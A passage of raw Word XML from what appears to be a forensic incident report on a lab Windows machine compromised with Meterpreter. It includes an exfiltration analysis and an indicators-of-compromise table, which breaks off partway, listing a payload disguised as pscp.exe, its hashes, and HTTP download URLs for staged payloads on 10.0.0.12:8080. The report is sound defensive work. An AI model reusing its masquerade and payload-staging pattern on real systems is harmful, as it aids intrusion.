        <w:t>Facts: (1) Archives: $UsnJrnl FileCreate of .zip/.7z/.rar/.tar/.gz/.cab on 2023-11-10 after 10:00 UTC are limited to Edge cache Sysmon[1].zip (10:23:48, Sysmon download, usnjrnl#89007 / mft#115566), Edge update MSEDGE.PACKED.7Z/MSEDGE.7z (11:15:07, usnjrnl#135719), Appraiser_AlternateData.cab (11:25:47), Cortana ConstraintIndex.cab and analyst-tool archives under Desktop\Tools (Live_ Acquisition_Tools.7z 11:41:40 usnjrnl#143282, python35.zip, Get-ZimmermanTools.zip, video-triage.zip). No archive created by pscp.exe / explorer 7324 / cmd 5848 / powershell 736. (2) Sysmon EID 3 (33 events, from 11:10:56): only attack-related connection is RecordID 336 (evtxecmd_0.csv#18681): powershell.exe PID 736 GUID {e6e9f951-0f56-654e-af01-000000000500}, 10.0.0.124:50009 -&gt; 10.0.0.12:8080/tcp, UtcTime 11:10:55.573 (wget 1.exe, 4104 evtxecmd_0.csv#8814). All other EID 3 are OneDrive/EdgeUpdate/SharePoint, KAPE/gkape, TimelineExplorer and analyst PowerShell 5300 (s3-1.amazonaws.com, KAPE update). No Sysmon EID 3 for pscp.exe (PID 2196) or explorer.exe 7324 (SwiftOnSecurity config does not log these images). (3) SRUM network usage: explorer.exe (medmondson) BytesSent 69,181 / BytesReceived 86,237 in interval ending 11:43 (srum#111) vs 3,284 sent at 10:15 (srum#61); powershell.exe 3,153 sent / 43,415 received at 11:43 (srum#116). No SRUM record for pscp.exe, 1.exe or test.exe. Largest senders are system/BITS/Firefox/DoSvc (lab setup). (4) BITS-Client 3/59/60: all jobs Microsoft (fs.microsoft.com fonts, g.live.com OneDrive config, oneclient.sfx.ms OneDriveSetup.exe, msedge.f.tlu.dl.delivery.mp.microsoft.com Edge) – no upload job, no 10.0.0.12. (5) Firewall 2004/2005/2006 in 10:15–11:45: only Firefox inbound rules (evtx#24271/24272) – no rule for pscp.exe/C:\Payloads. (6) OneDrive: only self-update (11:13) – no sign of sync of user data; DNS (Sysmon 22) shows no query for an external C2 or cloud-storage/exfil service.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>There is no artifact of data collection (staging directory, archive creation, compression tool execution) or of transfer via BITS, cloud sync, browser upload or rclone attributable to the attacker. The only remote peer of the attack is 10.0.0.12 on TCP 8080 (payload hosting and download of 1.exe). The Meterpreter reverse-session socket itself (pscp.exe/explorer 7324) was not logged by Sysmon (config filters), so the C2 port is inferred: 8080 is confirmed only for HTTP staging; the session port could differ. The ~66 KB increase of explorer.exe BytesSent in SRUM between 11:03 and 11:43 is consistent with Meterpreter C2 traffic (command output, netstat/whoami/tasklist results) and possibly the contents of not_my_pass.txt read via the session, but SRUM does not give destination and cannot prove exfiltration of a specific file. Volume excludes any bulk exfiltration. Confidence probable (negative finding, Sysmon coverage starts 10:51 and does not cover explorer network activity).</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11:43:00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received=86237 sent=69181 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_NetworkUsages_Output.csv#111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:00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received=68056 sent=3284 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_NetworkUsages_Output.csv#61</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:15:07.619336</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\PathUnknown\Directory with ID 0x000146ED-00000002\MSEDGE.PACKED.7Z</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=83694-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#135719</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:41:40.447180</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\Tools\Forensic_Program_Files\Live_Acquisition\Live_ Acquisition_Tools.7z</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=89237-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#143282</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:22.056897</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Bits-Client/Operational 59 | Microsoft-Windows-Bits-Client | BITS transfer has started | jobTitle: UpdateBinary | jobId: f9cdb807-3ff9-4592-8e3f-da45ed8b8cce | URL: https://oneclient.sfx.ms/Win/Installers/23.214.1015.0001/amd64/OneDriveSetup.exe | Peer:  | Total Bytes: 64958880 (Transferred: 0) | Bytes Transferred from Peer: 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#7376</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Bits-Client%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:25:51.789054</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Firewall With Advanced Security/Firewall 2004 | Microsoft-Windows-Windows Firewall With Advanced Security | A rule has been added to the Windows Defender Firewall exception list | : Firefox (C:\Program Files\Mozilla Firefox) | C:\Program Files\Mozilla Firefox\firefox.exe | Direction: Inbound | Action: Allow | Protocol: TCP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#24271</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Indicators of compromise</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="680"/>
        <w:gridCol w:w="907"/>
        <w:gridCol w:w="2381"/>
        <w:gridCol w:w="2381"/>
        <w:gridCol w:w="1247"/>
        <w:gridCol w:w="1247"/>
        <w:gridCol w:w="1701"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Value</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Context</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>First seen (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Last seen (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sha256</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ABBF7B5F7A059348A17DCD8BCD464767125F54B4F8691F0F810AC1819C6CF931</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Payloads\pscp.exe (Meterpreter, PuTTY PSCP masquerade); MD5 DED9E58DD95A88A4BEE89B74A65F05F1, IMPHASH ADD361A4F3939AF38D11873F1D74BDED (Sysmon 1 RecordID 305)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>md5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>DED9E58DD95A88A4BEE89B74A65F05F1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MD5 of C:\Payloads\pscp.exe (Sysmon 1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10.0.0.12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Payload server http://10.0.0.12:8080 (pscp.exe, 1.exe); Defender webfile origin and Sysmon 3 powershell → 10.0.0.12:8080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708098</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:56.791298</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23715</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18681</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>url</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>http://10.0.0.12:8080/pscp.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Download URL of Meterpreter pscp.exe (Defender 1116, Zone.Identifier)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708098</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23715</w:t>
              <w:br/>
              <w:t>mftecmd_mft/mft.csv#115204</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>url</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>http://10.0.0.12:8080/1.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Second stage downloaded by powershell PID 736 to C:\Users\medmondson\1.exe at 11:10:55 UTC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.494829</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.494829</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8814</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Payloads\pscp.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Malicious executable (Meterpreter), executed 11:03:09 UTC; related files C:\Payloads\test.exe and C:\Users\medmondson\1.exe (same size 986,624 bytes)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
